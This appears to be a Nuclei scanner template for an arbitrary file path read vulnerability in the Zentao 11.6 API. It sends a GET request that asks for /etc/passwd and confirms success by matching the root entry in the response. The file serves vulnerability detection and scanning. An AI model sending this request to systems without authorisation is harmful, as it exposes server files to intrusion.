id: zentao-filepath-fileread
info:
  name: "Zentao 11.6 API 任意文件路径读取漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: zentao
http:
  - raw:
      - |
        GET /api-getModel-api-getMethod-filePath=/etc/passwd/1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
